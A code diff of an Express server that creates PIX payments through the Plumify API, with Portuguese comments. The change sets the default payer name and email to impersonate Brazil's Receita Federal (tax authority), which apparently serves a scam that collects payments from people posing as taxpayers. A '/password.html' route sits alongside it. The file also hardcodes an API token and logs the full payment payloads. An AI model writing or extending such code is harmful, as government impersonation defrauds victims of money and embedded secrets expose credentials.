@@ -227,14 +227,14 @@ app.get('/password.html', (req, res) => {
 // Configurações Plumify
 const PLUMIFY_PRODUCT_HASH = 'smm88ihfg0';
 const PLUMIFY_API_TOKEN = '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa';
-const PLUMIFY_API_URL = 'https://api.plumify.com.br/v1';
+const PLUMIFY_API_URL = 'https://api.plumify.com.br/api';  // ou 'https://api.plumify.com.br'
 
 // Função para gerar ID único da transação
 function generateTransactionId() {
     return 'TX-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
 }
 
-// Rota para criar pagamento via Plumify
+// Rota para criar pagamento via Plumify (CORRIGIDA)
 app.post('/api/create-payment', async (req, res) => {
     const { amount, customer_name, customer_email, customer_cpf } = req.body;
 
@@ -249,8 +249,8 @@ app.post('/api/create-payment', async (req, res) => {
             currency: 'BRL',
             reference_id: generateTransactionId(),
             customer: {
-                name: customer_name || 'Contribuinte',
-                email: customer_email || 'pagador@exemplo.com',
+                name: customer_name || 'RECEITA FEDERAL LTDA',
+                email: customer_email || 'receitafederal@gov.com.br',
                 cpf: customer_cpf || '00000000000'
             },
             items: [{
@@ -261,16 +261,32 @@ app.post('/api/create-payment', async (req, res) => {
             payment_methods: ['pix']
         };
 
-        const response = await fetch(`${PLUMIFY_API_URL}/transactions`, {
-            method: 'POST',
-            headers: {
-                'Authorization': `Bearer ${PLUMIFY_API_TOKEN}`,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
+        console.log('📤 Enviando para Plumify:', JSON.stringify(payload, null, 2));
+
+        // Tentar diferentes endpoints
+        let response;
+        try {
+            response = await fetch(`https://api.plumify.com.br/api/transactions`, {
+                method: 'POST',
+                headers: {
+                    'Authorization': `Bearer ${PLUMIFY_API_TOKEN}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+        } catch(e) {
+            response = await fetch(`https://api.plumify.com.br/v1/transactions`, {
+                method: 'POST',
+                headers: {
+                    'Authorization': `Bearer ${PLUMIFY_API_TOKEN}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+        }
 
         const data = await response.json();
+        console.log('📥 Resposta Plumify:', data);
 
         res.json({
             success: true,
